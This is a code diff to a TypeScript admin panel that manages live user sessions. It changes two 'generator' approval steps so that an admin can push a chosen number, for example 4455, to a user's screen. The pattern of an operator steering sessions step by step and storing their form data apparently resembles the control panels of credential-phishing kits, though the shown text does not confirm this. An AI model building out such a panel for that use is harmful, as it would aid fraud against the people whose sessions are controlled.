@@ -1286,8 +1286,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
     if (!approvalValue) return;
 
-    // GENERATOR: modal yok — kullaniciyi direkt generator sayfasina yonlendir
-    if (approvalValue === "generator1" || approvalValue === "generator2") {
+    // GENERATOR 1: kod gerekmez — kullaniciyi direkt sayfaya yonlendir.
+    // GENERATOR 2: modal acilir, admin "Gosterilecek Rakam"i girer (or. 4455).
+    if (approvalValue === "generator1") {
       if (!supabase) return;
       const row = rowsRef.current.find((r) => r.id === sessionId);
       const previousFormData =
@@ -1334,6 +1335,29 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       row && row.form_data && typeof row.form_data === "object"
         ? (row.form_data as Record<string, string | undefined>)
         : {};
+
+    // GENERATOR 2: admin'in girdigi rakam (or. 4455) kullaniciya gosterilir
+    if (approvalPromptType === "generator2") {
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "generator2",
+          form_data: {
+            ...previousFormData,
+            generatorType: "generator2",
+            generatorCode: approvalCodeInput.trim(),
+          },
+        })
+        .eq("id", approvalPromptSessionId);
+
+      setApprovalPromptSessionId(null);
+      setApprovalPromptType("");
+      setApprovalCodeInput("");
+      void load();
+      return;
+    }
 
     await supabase
       .from("sessions")
